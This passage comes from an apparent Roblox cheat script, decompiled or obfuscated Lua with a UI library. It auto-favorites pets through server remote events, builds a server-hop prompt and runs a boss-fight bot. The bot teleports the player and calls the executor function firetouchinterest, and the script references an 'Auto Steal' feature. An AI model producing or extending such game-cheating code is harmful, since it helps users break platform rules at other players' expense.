						local flag3 = false

						for k in pairs(v16) do
							if tbl22[k] then
								flag3 = true
								break
							end
						end

						if flag3 then
							n8 += 1
						end
					end
				end

				if n5 > 0 then
					n7 += 1

					if n5 <= fn10(arg) then
						n8 += 1
					end
				end

				if n7 == 0 then
					return false
				end

				if v12 == tbl15[2] then
					return n8 == n7
				end
				return n8 > 0
			end

			local function fn13(arg)
				return (tbl24[arg] or 0) > os.clock()
			end

			local function fn14(arg)
				local tbl25 = {}
				local v16, v17, v18 = pairs(arg.Inventory or {})
				local n7 = 0

				for k, v19 in v16, v17, v18 do
					if type(v19) == "table" and fn12(v19) then
						n7 += 1

						if v19.IsFavorite ~= true and not fn13(k) then
							table.insert(tbl25, k)
						end
					end
				end

				return tbl25, n7
			end

			local function fn15(arg, arg2, arg3)
				local tbl25 = {}
				local inventory = arg.Inventory or {}
				local v16 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v16(equippedAssets) do
					local v17 = inventory[equippedAsset]

					if type(v17) == "table" and not fn13(equippedAsset) then
						if arg2 then
							if v17.IsFavorite ~= true then
								table.insert(tbl25, equippedAsset)
							end
						else
							local flag3 = v17.IsFavorite == true

							if flag3 then
								flag3 = not (arg3 and fn12(v17))
							end

							if flag3 then
								table.insert(tbl25, equippedAsset)
							end
						end
					end
				end

				return tbl25
			end

			local function fn16(arg, arg2)
				local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
				if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
					return
				end

				for i, v16 in ipairs(arg) do
					if not (i > n3) then
						tbl24[v16] = os.clock() + n4
						pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, v16, arg2)
						task.wait(0.12)
						continue
					end

					break
				end
			end

			local function fn17(arg, arg2)
				if flag2 or #arg == 0 then
					return false
				end
				flag2 = true
				n6 = os.clock() + n2

				task.spawn(function()
					pcall(fn16, arg, arg2)
					flag2 = false
					tbl3.Wake()
				end)

				return true
			end

			tbl3.Add(function()
				local v16 = fn8()
				if not v16 then
					return false
				end
				local v17 = tbl4.Toggle(v9, false)
				local v18, v19 = fn14(v16)

				if createText and type(createText.Set) == "function" then
					local v20 = pairs
					local inventory = v16.Inventory or {}
					local n7 = 0

					for _, v21 in v20(inventory) do
						if type(v21) == "table" and v21.IsFavorite == true then
							n7 += 1
						end
					end

					pcall(createText.Set, createText, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", v19, #v18, n7))
				end

				local v20 = flag2
				local flag3

				if flag2 then
					flag3 = v20
				else
					flag3 = os.clock() < n6
				end

				if flag3 then
					return false
				end

				if v17 and fn17(v18, true) then
					return false
				end

				if tbl4.Toggle(v10, false) then
					if fn17(fn15(v16, true, false), true) then
						return false
					end
				elseif tbl4.Toggle(v11, false) then
					fn17(fn15(v16, false, v17), false)
				end

				return false
			end)

			createText = v8.CreateText
			createText = createText(v8, { Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

			v9 = v8:CreateToggle({
				Name = "Auto Favorite Pet",
				Note = "Favorite pets matching the rules below",
				Default = false,
				Callback = function()
					table.clear(tbl24)
					tbl3.Wake()
				end,
			})

			v8:CreateButton({
				Name = "Favorite Pets Now",
				Note = "Favorite matching pets once",
				ButtonText = "Favorite",
				ConfirmText = "Done!",
				SubOf = v9,
				Callback = function()
					local v16 = fn8()

					if v16 then
						fn17(fn14(v16), true)
					end
				end,
			})

			v8:CreateDropdown({
				Name = "Favorite Rule",
				Note = "Pass any check or all checks",
				Options = tbl15,
				Default = tbl15[2],
				SubOf = v9,
				Callback = function(arg)
					if table.find(tbl15, arg) then
						v12 = arg
						tbl3.Wake()
					end
				end,
			})

			v8:CreateDropdown({
				Name = "Favorite Min Rarity",
				Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
				Options = tbl16,
				Default = "Off",
				SubOf = v9,
				Callback = function(arg)
					v13 = tbl17[arg]
					tbl3.Wake()
				end,
			})

			fn6(v8:CreateMultiDropdown({
				Name = "Favorite Mutations",
				Note = "Mutation check (empty = skip)",
				Options = tbl20,
				Default = {},
				SubOf = v9,
				Callback = function(arg)
					local tbl25 = {}
					local flag3 = false

					if type(arg) == "table" then
						for k, v16 in pairs(arg) do
							k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16 or nil

							if k == str then
								flag3 = true
							elseif k then
								tbl25[tbl21[k] or k] = true
							end
						end
					end

					flag = flag3
					tbl22 = tbl25
					tbl3.Wake()
				end,
			}))

			local tbl25 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n7 = 0
			local str2 = "M/s"

			local function fn18(arg, arg2)
				if arg ~= nil then
					n7 = math.max(0, math.floor(tonumber(arg) or n7))
				end

				if arg2 ~= nil then
					str2 = tostring(arg2)
				end

				n5 = n7 * (tbl25[str2] or tbl25["M/s"]).Mult
				tbl3.Wake()
			end

			fn5(v8, {
				Name = "Min Favorite Value",
				Note = "Value check (0 = skip)",
				SubOf = v9,
				Legacy = "Favorite Min Value",
				SectionName = "Auto Favorite",
				OnRaw = function(arg)
					fn18(math.floor(arg / 1000), "K/s")
				end,
			})

			fn6(v8:CreateMultiDropdown({
				Name = "Always Favorite Species",
				Note = "Always favorite these species",
				Options = tbl18,
				Default = {},
				SubOf = v9,
				Callback = function(arg)
					local tbl26 = {}

					if type(arg) == "table" then
						for k, v16 in pairs(arg) do
							k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16
							local v17 = k or nil

							if v17 and tbl19[v17] then
								tbl26[tbl19[v17]] = true
							end
						end
					end

					tbl23 = tbl26
					tbl3.Wake()
				end,
			}))

			v10 = v8:CreateToggle({
				Name = "Auto Favorite Equipped",
				Note = "Keep equipped pets favorited",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v11 = v8:CreateToggle({
				Name = "Auto Unfavorite Equipped",
				Note = "Unfavorite equipped pets not in the rules",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v8:CreateButton({
				Name = "Favorite Equipped Now",
				Note = "Favorite all equipped pets once",
				ButtonText = "Favorite",
				ConfirmText = "Done!",
				Callback = function()
					local v16 = fn8()

					if v16 then
						fn17(fn15(v16, true, false), true)
					end
				end,
			})

			v8:CreateButton({
				Name = "Unfavorite Equipped Now",
				Note = "Unfavorite all equipped pets once",
				ButtonText = "Unfavorite",
				ConfirmText = "Done!",
				Callback = function()
					local v16 = fn8()

					if v16 then
						fn17(fn15(v16, false, false), false)
					end
				end,
			})
		end

		local save = tbl.Save

		if type(save) == "table" and type(save.FieldSignal) == "function" then
			for _, v16 in ipairs({ "Inventory", "EquippedAssets" }) do
				local ok, result = pcall(save.FieldSignal, v16)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local function fn11()
			local tbl25 = {}

			local function fn12(arg)
				local v16 = tbl25[arg]
				if type(v16) ~= "string" then
					return ""
				end
				return v16
			end

			local function fn13(arg, text)
				arg.AutoLocalize = false
				arg.Text = text
			end

			local n7 = 0
			local tbl26 = nil

			local function fn14()
				if not tbl26 then
					return
				end

				for _, v16 in ipairs(tbl26) do
					fn13(v16[1], fn12(v16[2]))
				end
			end

			local connection = UserInputService.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch or userInputType == Enum.UserInputType.Keyboard or userInputType == Enum.UserInputType.Gamepad1 then
					n7 = os.clock()
				end
			end)

			fn4(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)

			local function fn15()
				return os.clock() - n7 <= 1
			end

			local screenGui = nil
			local uiScale = nil
			local tbl27 = {}
			local fn16 = nil
			local fn17 = nil

			local function fn18()
				if not uiScale then
					return
				end
				local currentCamera = workspace.CurrentCamera
				currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

				if currentCamera.X < 1 then
					currentCamera = Vector2.new(1280, 720)
				end

				uiScale.Scale = math.clamp(math.min(currentCamera.X / 1280, currentCamera.Y / 720), 0.72, 1.35)
			end

			local function fn19()
				if screenGui then
					screenGui.Enabled = false
				end
			end

			local font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			local colorSequence = ColorSequence.new
			local tbl28 = {}
			local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
			local v17 = ColorSequenceKeypoint.new(0.486, Color3.fromRGB(255, 255, 255))
			local v18 = ColorSequenceKeypoint.new(0.519, Color3.fromRGB(221, 221, 221))
			local new = ColorSequenceKeypoint.new
			local color = Color3.fromRGB
			tbl28[1] = v16
			tbl28[2] = v17
			tbl28[3] = v18

			do
				local values = table.pack(new(1, color(236, 236, 236)))
				table.move(values, 1, values.n, 4, tbl28)
			end

			local v19 = colorSequence(tbl28)
			local new2 = ColorSequenceKeypoint.new
			local color2 = Color3.fromRGB
			local colorSequence2 = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 36, 84)), new2(1, color2(0, 31, 54)) })
			local colorSequence3 = ColorSequence.new
			local tbl29 = {}
			local v20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
			local v21 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(255, 132, 123))
			local new3 = ColorSequenceKeypoint.new
			local color3 = Color3.fromRGB
			tbl29[1] = v20
			tbl29[2] = v21

			do
				local values = table.pack(new3(1, color3(239, 28, 28)))
				table.move(values, 1, values.n, 3, tbl29)
			end

			local v22 = colorSequence3(tbl29)
			local colorSequence4 = ColorSequence.new
			local tbl30 = {}
			local v23 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
			local v24 = ColorSequenceKeypoint.new(0.015, Color3.fromRGB(255, 132, 123))
			local new4 = ColorSequenceKeypoint.new
			local color4 = Color3.fromRGB
			tbl30[1] = v23
			tbl30[2] = v24

			do
				local values = table.pack(new4(1, color4(239, 28, 28)))
				table.move(values, 1, values.n, 3, tbl30)
			end

			local v25 = colorSequence4(tbl30)
			local colorSequence5 = ColorSequence.new
			local tbl31 = {}
			local v26 = ColorSequenceKeypoint.new(0, Color3.fromRGB(92, 94, 106))
			local v27 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(70, 71, 82))
			local new5 = ColorSequenceKeypoint.new
			local color5 = Color3.fromRGB
			tbl31[1] = v26
			tbl31[2] = v27

			do
				local values = table.pack(new5(1, color5(38, 39, 46)))
				table.move(values, 1, values.n, 3, tbl31)
			end

			local v28 = colorSequence5(tbl31)

			local function createUIStroke(parent, applyStrokeMode, thickness, color6)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				uiStroke.ApplyStrokeMode = applyStrokeMode
				uiStroke.Color = color6 or Color3.fromRGB(0, 0, 0)
				uiStroke.LineJoinMode = Enum.LineJoinMode.Round
				uiStroke.Thickness = thickness
				uiStroke.Transparency = 0
				uiStroke.Parent = parent
				return uiStroke
			end

			local function createUIGradient(parent, color6, rotation)
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = fn3()
				uiGradient.Color = color6
				uiGradient.Rotation = rotation or 90
				uiGradient.Parent = parent
				return uiGradient
			end

			local function createUIStroke2(parent, textSize)
				parent.FontFace = font
				parent.TextColor3 = Color3.fromRGB(255, 255, 255)
				parent.TextStrokeTransparency = 1
				parent.TextSize = textSize
				parent.LineHeight = 1
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				uiStroke.Color = Color3.fromRGB(0, 0, 0)
				uiStroke.LineJoinMode = Enum.LineJoinMode.Round
				uiStroke.Thickness = math.max(1, textSize * 0.08)
				uiStroke.Transparency = 0
				uiStroke.Parent = parent
				return uiStroke
			end

			local function fn20(arg, arg2)
				local v29 = createUIStroke2(arg, arg2)
				createUIGradient(v29, colorSequence2, 90)
				createUIGradient(arg, v19, 90)
				v29.Thickness = math.max(1, arg2 * 0.065)
			end

			local function fn21()
				if screenGui then
					return
				end
				screenGui = Instance.new("ScreenGui")
				screenGui.Name = fn3()
				screenGui.DisplayOrder = 2e9
				screenGui.IgnoreGuiInset = true
				screenGui.ResetOnSpawn = false
				screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				screenGui.Enabled = false
				local textButton = Instance.new("TextButton")
				textButton.Name = fn3()
				textButton.AutoButtonColor = false
				textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				textButton.BackgroundTransparency = 0.45
				textButton.BorderSizePixel = 0
				textButton.Modal = true
				textButton.Size = UDim2.fromScale(1, 1)
				textButton.Text = ""
				textButton.ZIndex = 1
				textButton.Parent = screenGui
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.Active = true
				frame.AnchorPoint = Vector2.new(0.5, 0.5)
				frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				frame.BackgroundTransparency = 0.18
				frame.Position = UDim2.fromScale(0.5, 0.5)
				frame.Size = UDim2.fromOffset(430, 316)
				frame.ZIndex = 10
				frame.Parent = screenGui
				uiScale = Instance.new("UIScale")
				uiScale.Name = fn3()
				uiScale.Parent = frame
				createUIStroke(frame, Enum.ApplyStrokeMode.Border, 2)
				local frame2 = Instance.new("Frame")
				frame2.Name = fn3()
				frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame2.BorderSizePixel = 0
				frame2.Position = UDim2.fromOffset(22, 22)
				frame2.Size = UDim2.fromOffset(5, 26)
				frame2.ZIndex = 12
				frame2.Parent = frame
				createUIGradient(frame2, v22, 90)
				createUIStroke(frame2, Enum.ApplyStrokeMode.Border, 1.4)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.fromOffset(38, 20)
				textLabel.Size = UDim2.fromOffset(370, 30)
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = 12
				textLabel.Parent = frame
				fn20(textLabel, 21)
				fn13(textLabel, fn12("Title"))
				local frame3 = Instance.new("Frame")
				frame3.Name = fn3()
				frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				frame3.BackgroundTransparency = 0.82
				frame3.BorderSizePixel = 0
				frame3.Position = UDim2.fromOffset(22, 58)
				frame3.Size = UDim2.fromOffset(386, 1)
				frame3.ZIndex = 12
				frame3.Parent = frame
				local textLabel2 = Instance.new("TextLabel")
				textLabel2.Name = fn3()
				textLabel2.BackgroundTransparency = 1
				textLabel2.Position = UDim2.fromOffset(22, 68)
				textLabel2.Size = UDim2.fromOffset(386, 24)
				textLabel2.TextXAlignment = Enum.TextXAlignment.Left
				textLabel2.TextYAlignment = Enum.TextYAlignment.Center
				textLabel2.ZIndex = 12
				textLabel2.Parent = frame
				createUIStroke2(textLabel2, 17)
				textLabel2.TextColor3 = Color3.fromRGB(255, 72, 72)
				createUIGradient(textLabel2, ColorSequence.new(Color3.fromRGB(255, 132, 123), Color3.fromRGB(239, 28, 28)), 90)
				fn13(textLabel2, fn12("Warn"))
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.Name = fn3()
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(22, 98)
				textLabel3.Size = UDim2.fromOffset(386, 74)
				textLabel3.TextWrapped = true
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				textLabel3.TextYAlignment = Enum.TextYAlignment.Top
				textLabel3.ZIndex = 12
				textLabel3.Parent = frame
				createUIStroke2(textLabel3, 15)
				textLabel3.LineHeight = 1.14
				textLabel3.TextTransparency = 0.12
				fn13(textLabel3, fn12("Body"))
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.Name = fn3()
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(22, 176)
				textLabel4.Size = UDim2.fromOffset(386, 46)
				textLabel4.TextWrapped = true
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextYAlignment = Enum.TextYAlignment.Top
				textLabel4.ZIndex = 12
				textLabel4.Parent = frame
				createUIStroke2(textLabel4, 14)
				textLabel4.LineHeight = 1.12
				textLabel4.TextColor3 = Color3.fromRGB(255, 176, 120)
				fn13(textLabel4, fn12("Tip"))

				local function fn22(arg, arg2, arg3)
					local textButton2 = Instance.new("TextButton")
					textButton2.Name = fn3()
					textButton2.Active = true
					textButton2.AutoButtonColor = false
					textButton2.BackgroundTransparency = 1
					textButton2.BorderSizePixel = 0
					textButton2.Position = UDim2.fromOffset(arg, 244)
					textButton2.Size = UDim2.fromOffset(arg2, 46)
					textButton2.Text = ""
					textButton2.ZIndex = 14
					textButton2.Parent = frame
					local frame4 = Instance.new("Frame")
					frame4.Name = fn3()
					frame4.AnchorPoint = Vector2.new(0.5, 0.5)
					frame4.BackgroundColor3 = arg3 and Color3.fromRGB(175, 0, 0) or Color3.fromRGB(24, 25, 30)
					frame4.BorderSizePixel = 0
					frame4.Position = UDim2.fromScale(0.5, 0.5)
					frame4.Size = UDim2.fromScale(1, 0.92)
					frame4.ZIndex = 12
					frame4.Parent = textButton2
					createUIStroke(frame4, Enum.ApplyStrokeMode.Border, 1.6)
					local frame5 = Instance.new("Frame")
					frame5.Name = fn3()
					frame5.AnchorPoint = Vector2.new(0.5, 0)
					frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					frame5.BorderSizePixel = 0
					frame5.Position = UDim2.fromScale(0.5, 0)
					frame5.Size = UDim2.fromScale(1, 0.9)
					frame5.ZIndex = 12
					frame5.Parent = frame4
					createUIGradient(frame5, arg3 and v22 or v28, 90)
					local frame6 = Instance.new("Frame")
					frame6.Name = fn3()
					frame6.AnchorPoint = Vector2.new(0.5, 0.5)
					frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					frame6.BorderSizePixel = 0
					frame6.Position = UDim2.fromScale(0.5, 0.5)
					frame6.Size = UDim2.fromScale(0.965, 0.88)
					frame6.ZIndex = 13
					frame6.Parent = frame5
					createUIGradient(frame6, arg3 and v25 or v28, 90)
					local textLabel5 = Instance.new("TextLabel")
					textLabel5.Name = fn3()
					textLabel5.AnchorPoint = Vector2.new(0.5, 0.5)
					textLabel5.BackgroundTransparency = 1
					textLabel5.Position = UDim2.fromScale(0.5, 0.5)
					textLabel5.Size = UDim2.fromScale(0.9, 0.6)
					textLabel5.TextWrapped = true
					textLabel5.ZIndex = 15
					textLabel5.Parent = textButton2
					fn20(textLabel5, 17)
					return textButton2, textLabel5
				end

				local v29, v30 = fn22(22, 184, false)
				local v31, v32 = fn22(224, 184, true)
				fn13(v30, fn12("Cancel"))
				fn13(v32, fn12("Accept"))

				tbl26 = {
					{ textLabel, "Title" },
					{ textLabel2, "Warn" },
					{ textLabel3, "Body" },
					{ textLabel4, "Tip" },
					{ v30, "Cancel" },
					{ v32, "Accept" },
				}

				fn14()

				tbl27[#tbl27 + 1] = v29.MouseButton1Click:Connect(function()
					if fn17 then
						fn17()
					end
				end)

				tbl27[#tbl27 + 1] = v31.MouseButton1Click:Connect(function()
					if fn16 then
						fn16()
					end
				end)

				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					tbl27[#tbl27 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn18)
				end

				fn18()
				screenGui.Parent = v3
			end

			local function fn22()
				fn21()
				fn18()

				if screenGui then
					screenGui.Enabled = true
				end
			end

			fn4(function()
				for _, v29 in ipairs(tbl27) do
					pcall(function()
						v29:Disconnect()
					end)
				end

				table.clear(tbl27)

				if screenGui then
					pcall(function()
						screenGui:Destroy()
					end)

					screenGui = nil
				end
			end)

			return {
				Manual = fn15,
				Hide = fn19,
				Show = function(arg, arg2, arg3)
					for k, v29 in pairs(arg) do
						tbl25[k] = v29
					end

					fn14()

					fn16 = function()
						fn19()

						if arg2 then
							arg2()
						end
					end

					fn17 = function()
						fn19()

						if arg3 then
							arg3()
						end
					end

					fn22()
					fn14()
				end,
			}
		end

		tbl4.HopPrompt = fn11()

		tbl4.MechBoot = function(arg)
			local ok, result = pcall(function()
				return require(ReplicatedStorage.Shared.Util.ScrambleBossHazards)
			end)

			local mech = {
				Handle = nil,
				Row = nil,
				Status = "Idle",
				Shown = nil,
				Busy = false,
				Generation = 0,
				Hazards = {},
				TravelSpeed = 250,
				Radius = 18,
				SwingGap = 0.12,
				Dodge = true,
				TryBall = true,
				Leave = true,
				HopWindow = 3,
				OpenSeconds = 900,
				ChainPath = "ChilliLibrary/SAE_BossHop.json",
				ChainUntil = 0,
				ChainCycle = nil,
				ArmedCycle = nil,
				HopStamp = 0,
				ArrivedByHop = false,
				HopDelay = 5,
				HopConfirmed = false,
				HopNote = nil,
				HopAt = nil,
				Hopping = false,
				LoadedAt = os.clock(),
				BaitSpeed = 225,
				Interval = 1800,
				Run = nil,
				SwapTools = true,
				SwapIndex = 1,
				SwapSince = 0,
				MainHold = 0.3,
				SecondHold = 0.4,
				LastSwing = 0,
				Links = {},
			}

			tbl4.Mech = mech

			local function fn12()
				return tbl4.Toggle(mech.Handle, false) == true
			end

			local function fn13()
				return workspace:FindFirstChild("ScrambleArena")
			end

			local function fn14()
				return workspace:FindFirstChild("ScrambleArenaPortal")
			end

			local function fn15()
				return localPlayer:GetAttribute("InScrambleArena") == true
			end

			mech.StealFirst = function()
				local steal = tbl4.Steal
				local movement = tbl4.Movement
				if movement.PlaceWanted == true then
					return "Auto Place Egg goes first"
				end

				if movement.MutationWanted == true then
					return "Scrambled Mutation goes first"
				end

				if tbl4.Toggle(v5, false) == true and steal ~= nil and (steal.Wanted == true or steal.Carrying == true or steal.Active == true) then
					return "Auto Steal goes first"
				end
				return nil
			end

			pcall(function()
				local scheduleIntervalSeconds = require(ReplicatedStorage.Shared.Flags.ScrambleBossFlags).ScheduleIntervalSeconds
				local interval = type(scheduleIntervalSeconds) == "table" and tonumber(scheduleIntervalSeconds.Value) or nil

				if interval and interval > 0 then
					mech.Interval = interval
				end
			end)

			mech.Clock = function(arg2)
				local n7 = math.max(0, math.floor(arg2 + 0.5))
				return string.format("%d:%02d", math.floor(n7 / 60), n7 % 60)
			end

			mech.Timer = function()
				local serverTimeNow = workspace:GetServerTimeNow()
				local scrambleArena = workspace:FindFirstChild("ScrambleArena")
				scrambleArena = scrambleArena and tonumber(scrambleArena:GetAttribute("SpawnsAt")) or 0

				if workspace:FindFirstChild("ScrambleArenaPortal") then
					if serverTimeNow < scrambleArena then
						return "Mech portal is open  |  boss spawns in " .. mech.Clock(scrambleArena - serverTimeNow)
					end
					return "Mech portal is open now"
				end

				local interval = mech.Interval
				return "Next Mech portal in " .. mech.Clock(math.ceil(serverTimeNow / interval) * interval - serverTimeNow)
			end

			local function fn16(arg2)
				if not arg2 then
					return nil
				end
				local hitbox = arg2:FindFirstChild("Hitbox", true)
				if hitbox and hitbox:IsA("BasePart") then
					return hitbox
				end

				for _, descendant in ipairs(arg2:GetDescendants()) do
					if descendant:IsA("TouchTransmitter") and descendant.Parent and descendant.Parent:IsA("BasePart") then
						return descendant.Parent
					end
				end

				return nil
			end

			local function fn17(arg2)
				local v16 = tbl4.Root()
				if not v16 or not arg2 or type(firetouchinterest) ~= "function" then
					return
				end

				pcall(function()
					firetouchinterest(v16, arg2, 0)
					task.wait(0.05)
					firetouchinterest(v16, arg2, 1)
				end)
			end

			local function fn18(arg2, arg3)
				if not mech.Dodge or not ok or type(result) ~= "table" or type(result.Contains) ~= "function" then
					return false
				end

				for k, hazard in pairs(mech.Hazards) do
					local n7 = tonumber(hazard.At) or 0
					local n8 = tonumber(hazard.Warn) or 0
					if n7 + (tonumber(hazard.Duration) or 0.5) + 1.5 < arg3 then
						mech.Hazards[k] = nil
						continue
					end

					if arg3 >= n7 - n8 - 0.1 then
						local ok2, result2 = pcall(result.Contains, hazard, arg2, arg3)
						if ok2 and result2 then
							return true
						end
					end
				end

				return false
			end

			local function fn19()
				local character = localPlayer.Character
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				for _, v16 in ipairs({ character, backpack }) do
					if v16 then
						for _, child in ipairs(v16:GetChildren()) do
							if child:IsA("Tool") and tostring(child:GetAttribute("ItemType")) == "Gear" then
								if string.find(string.lower(tostring(child:GetAttribute("GearName") or "")), "scrambler", 1, true) then
									return child
								end
							end
						end
					end
				end

				return nil
			end

			local function fn20()
				local lastSwing = mech.LastSwing
				if os.clock() - lastSwing < mech.SwingGap then
					return
				end
				mech.LastSwing = os.clock()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local flag3 = type(tbl4.FindBat) == "function" and tbl4.FindBat() or nil
				local swapTools = mech.SwapTools and fn19() or nil
				local flag4

				if flag3 and swapTools and flag3 ~= swapTools then
					local secondHold = mech.SwapIndex == 2 and mech.SecondHold or mech.MainHold
					local swapSince = mech.SwapSince

					if os.clock() - swapSince >= secondHold then
						mech.SwapIndex = mech.SwapIndex == 2 and 1 or 2
						mech.SwapSince = os.clock()
					end

					flag4 = mech.SwapIndex == 2 and swapTools or flag3
				else
					flag4 = flag3 or swapTools
				end

				if not flag4 or not humanoid then
					return
				end

				if flag4.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(flag4)
					end)
				end

				pcall(function()
					flag4:Activate()
				end)
			end

			local function fn21(arg2, arg3)
				local character = localPlayer.Character
				local v16 = tbl4.Root()
				if not character or not v16 then
					return
				end

				if (v16.Position - arg2).Magnitude > 3 then
					pcall(function()
						character:PivotTo(CFrame.lookAt(arg2, Vector3.new(arg3.X, arg2.Y, arg3.Z)))
						v16.AssemblyLinearVelocity = Vector3.zero
					end)
				end
			end

			local function fn22(arg2)
				local mech2 = arg2:FindFirstChild("Mech")
				local hitbox = mech2 and mech2:FindFirstChild("Hitbox")
				if hitbox and hitbox:IsA("BasePart") then
					return hitbox.Position, mech2
				end

				for _, child in ipairs(arg2:GetChildren()) do
					if child:IsA("Model") and child.Name ~= "Ball" and child.Name ~= "LeaveTeleport" and child.Name ~= "Structure" then
						local hitbox2 = child:FindFirstChild("Hitbox")
						if hitbox2 and hitbox2:IsA("BasePart") then
							return hitbox2.Position, child
						end
					end
				end

				return nil, nil
			end

			local function fn23(arg2, arg3)
				local ball = arg2:FindFirstChild("Ball")
				if not ball then
					return false
				end
				local position = ball:GetBoundingBox().Position
				local n7 = (tonumber(arg2:GetAttribute("FloorY")) or position.Y) + 3
				local n8 = tonumber(arg2:GetAttribute("CoreStage")) or 0

				if arg2:GetAttribute("BallStunned") == true then
					mech.Run = nil
					local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)
					local unit = vector.Magnitude > 1 and vector.Unit or Vector3.new(1, 0, 0)
					fn21(Vector3.new(position.X, n7, position.Z) + unit * 10, position)
					fn20()
					mech.Status = string.format("Smashing the core  |  stage %d / 3  |  core %s", n8, tostring(arg2:GetAttribute("CoreHealth") or "?"))
					return true
				end

				local str2 = tostring(arg2:GetAttribute("BallTarget"))
				local attribute = arg2:GetAttribute("BallCoil")

				if not mech.Run and str2 == tostring(localPlayer.UserId) and type(attribute) == "string" and attribute ~= "" then
					local coils = arg2:FindFirstChild("Coils")
					local attribute2 = coils and coils:FindFirstChild(attribute)
					attribute2 = attribute2 and attribute2:GetAttribute("Home")

					if typeof(attribute2) == "Vector3" then
						local vector = Vector3.new(attribute2.X - position.X, 0, attribute2.Z - position.Z)

						if vector.Magnitude > 1 then
							mech.Run = {
								Goal = Vector3.new(attribute2.X, n7, attribute2.Z) + vector.Unit * 40,
								Until = os.clock() + 8,
								Coil = attribute,
							}
						end
					end
				end

				if mech.Run then
					local vector = Vector3.new(mech.Run.Goal.X - arg3.Position.X, 0, mech.Run.Goal.Z - arg3.Position.Z)
					local flag3 = vector.Magnitude < 4

					if not flag3 then
						local until_ = mech.Run.Until
						flag3 = os.clock() > until_
					end

					if flag3 then
						mech.Run = nil

						pcall(function()
							arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
						end)
					else
						local n9 = vector.Unit * mech.BaitSpeed

						pcall(function()
							arg3.AssemblyLinearVelocity = Vector3.new(n9.X, arg3.AssemblyLinearVelocity.Y, n9.Z)
						end)

						mech.Status = string.format("Baiting the ball into %s  |  stage %d / 3", mech.Run.Coil, n8)
					end

					return true
				end

				local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)

				if vector.Magnitude > 18 or vector.Magnitude < 6 then
					local vector2 = vector.Magnitude < 1 and Vector3.new(1, 0, 0) or vector.Unit
					fn21(Vector3.new(position.X, n7, position.Z) + vector2 * 12, position)
				end

				mech.Status = string.format("Ball phase, waiting for it to lock on  |  stage %d / 3", n8)
				return true
			end

			local function fn24(arg2, arg3)
				local scrambleHuman = arg2:FindFirstChild("ScrambleHuman")
				if not scrambleHuman then
					return false
				end
				local humanoidRootPart = scrambleHuman:FindFirstChild("HumanoidRootPart") or scrambleHuman.PrimaryPart or scrambleHuman:FindFirstChildWhichIsA("BasePart")
				local position = humanoidRootPart and humanoidRootPart.Position or scrambleHuman:GetPivot().Position
				humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity or Vector3.zero
				local n7 = position + Vector3.new(humanoidRootPart.X, 0, humanoidRootPart.Z) * 0.15
